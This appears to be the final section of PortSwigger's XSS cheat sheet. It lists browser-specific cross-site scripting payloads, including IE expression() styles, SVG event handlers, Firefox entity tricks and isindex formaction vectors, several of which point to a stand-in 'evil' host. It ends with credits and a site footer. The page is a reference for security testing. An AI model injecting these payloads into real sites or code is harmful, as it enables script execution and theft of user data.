<div style=xss:expression(alert(1))> <div style=xss:expression(1)-alert(1)> <div style=xss:expressio\6e(alert(1))> <div style=xss:expressio\006e(alert(1))> <div style=xss:expressio\00006e(alert(1))> <div style=xss:expressio\6e(alert(1))> <div style=xss:expressio&#x5c;6e(alert(1))>
Jump to the code
In quirks mode IE allowed you to use = instead of :

<div style=xss=expression(alert(1))> <div style="color&#x3dred">test</div>
Jump to the code
Behaviors for older modes of IE

<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XSS</a>
Jump to the code
Older versions of IE supported event handlers in functions

<script> function window.onload(){ alert(1); } </script> <script> function window::onload(){ alert(1); } </script> <script> function window.location(){ } </script> <body> <script> function/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){} </script> </body> <body> <script> function document.body.innerHTML(){ x = "<img src=1 onerror=alert(1)>"; } </script> </body>
Jump to the code
GreyMagic HTML+time exploit (no longer works even in 5 docmode)

<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<img src=1 onerror=alert(1)>"> </BODY></HTML>
Jump to the codeWorks in Firefox
Firefox allows NULLS after &

<a href="javascript&#x6a;avascript:alert(1)">Firefox</a>
Jump to the codeWorks in Firefox
Firefox allows NULLs inside named entities

<a href="javascript&colon;alert(1)">Firefox</a>
Jump to the codeWorks in Firefox
Firefox allows NULL characters inside opening comments

<!-- ><img title="--><iframe/onload=alert(1)>"> --> <!-- ><img title="--><iframe/onload=alert(1)>"> -->
Jump to the codeWorks in Safari
Safari used to allow any tag to have a onload event inside SVG

<svg><xss onload=alert(1)>
Jump to the code
Isindex using src attribute

<isindex type=image src="//evil?
Jump to the code
Isindex using submit

<isindex type=submit style=width:100%;height:100%; value=XSS formaction="//evil?
Jump to the code
Isindex and formaction

<isindex type=submit formaction=javascript:alert(1)>
Jump to the code
Isindex and action

<isindex type=submit action=javascript:alert(1)>
Jump to the codeWorks in Chrome
discard tag and onbegin

<svg><discard onbegin=alert(1)>
Jump to the code
Use element with an external URL

<svg><use href="//subdomain1.portswigger-labs.net/use_element/upload.php#x" /></svg>
Jump to the codeWorks in Firefox
onloadstart event for media elements in Firefox v107 and below

<img src=validimage.png onloadstart=alert(1)>
Jump to the codeWorks in Firefox
onloadend event for media elements in Firefox v107 and below

<input type=image onloadend=alert(1) src=validimage.png>
Jump to the code
Credits

Brought to you by PortSwigger Research. Created by @garethheyes.

This cheat sheet wouldn't be possible without the web security community who share their research. Big thanks to: James Kettle, Mario Heiderich, Eduardo Vela, Masato Kinugawa, Filedescriptor, LeverOne, Ben Hayak, Alex Inführ, Mathias Karlsson, Jann Horn, Ian Hickey, Gábor Molnár, tsetnep, Psych0tr1a, Skyphire, Abdulrhman Alqabandi, brainpillow, Kyo, Yosuke Hasegawa, White Jordan, Algol, jackmasa, wpulog, Bolk, Robert Hansen, David Lindsay, Superhei, Michal Zalewski, Renaud Lifchitz, Roman Ivanov, Frederik Braun, Krzysztof Kotowicz, Giorgio Maone, GreyMagic, Marcus Niemietz, Soroush Dalili, Stefano Di Paola, Roman Shafigullin, Lewis Ardern, Michał Bentkowski, SØᴘᴀS, avanish46, Juuso Käenmäki, jinmo123, itszn13, Martin Bajanik, David Granqvist, Andrea (theMiddle) Menin, simps0n, hahwul, Paweł Hałdrzyński, Jun Kokatsu, RenwaX23, sratarun, har1sec, Yann C., gadhiyasavan, p4fg, diofeher, Sergey Bobrov, PwnFunction, Guilherme Keerok, Alex Brasetvik, s1r1us, ngyikp, the-xentropy, Rando111111, Fzs, Sivakumar, Dwi Siswanto, bxmbn, Tarunkant Gupta, Rando111111, laytonctf, Begeek, Hannes Leopold, yawnmoth, yawnmoth, Yair Amit, Franz Sedlmaier, Łukasz Pilorz, Steven Christey, Dan Crowley, Rene Ledosquet, Kurt Huwig, Moritz Naumann, Jonathan Vanasco, nEUrOO, Sec Consult, Timo, Ozh, David Ross, Lukasz Plonka (sp3x), xhzeem

You can contribute to this cheat sheet by creating a new issue or updating the JSON and creating a pull request

Burp Suite

Web vulnerability scanner
Burp Suite Editions
Release Notes
 
Vulnerabilities

Cross-site scripting (XSS)
SQL injection
Cross-site request forgery
XML external entity injection
Directory traversal
Server-side request forgery
 
Customers

Organizations
Testers
Developers
 
Company

About
PortSwigger News
Careers
Contact
Legal
Privacy Notice
 
Insights

Web Security Academy
Blog
Research
 
PortSwigger Logo
Follow us
© 2023 PortSwigger Ltd.
